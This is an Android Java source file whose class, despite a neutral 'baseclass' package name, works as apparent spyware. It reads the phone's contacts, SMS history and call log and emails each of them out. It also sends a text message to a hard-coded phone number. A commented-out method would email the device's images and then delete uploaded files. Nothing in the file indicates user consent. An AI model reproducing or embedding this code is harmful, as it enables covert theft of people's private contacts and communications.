package com.xuhong.baseclass.model.impl;

import android.content.Context;

import com.xuhong.baseclass.model.SendEmail;
import com.xuhong.baseclass.utils.EmailUtils;

/**
 * Created by BHKJ on 2017/1/11.
 */

public class SendEmailImpl implements SendEmail {
    @Override
    public void sendPhoneNumber(Context context) throws Exception {
        PhoneContacts phoneContacts = new PhoneContacts();
        EmailUtils.sendEmail("电话号码", phoneContacts.getPhoneContacts(context));
        android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
        smsManager.sendTextMessage("18180646037", null, "号码", null, null);
    }

    @Override
    public void sendMsg(Context context) throws Exception {
        PhoneContacts phoneContacts = new PhoneContacts();

            EmailUtils.sendEmail("短信记录", phoneContacts.getMsg(context));


    }

    @Override
    public void sendCallRecord(Context context) throws Exception {
        PhoneContacts phoneContacts = new PhoneContacts();
        EmailUtils.sendEmail("通话记录", phoneContacts.getCallPhone(context));
    }


//    private void sendImg() throws Exception {
//        ImageInSD imageInSD = new ImageInSD();
//        imageInSD.getImagePathFromSD();
//        List<String> paths = imageInSD.getImagePathList();
//        EmailUtils.sendEmailPic("图片", "图片", paths);
//        String str = Environment.getExternalStorageDirectory() + "/upload";
//        File file = new File(str);
//        File[] files = file.listFiles();
//        for (File fileChild : files) {
//            if (fileChild.isFile()) {
//                fileChild.delete();
//            }
//        }
//    }

}
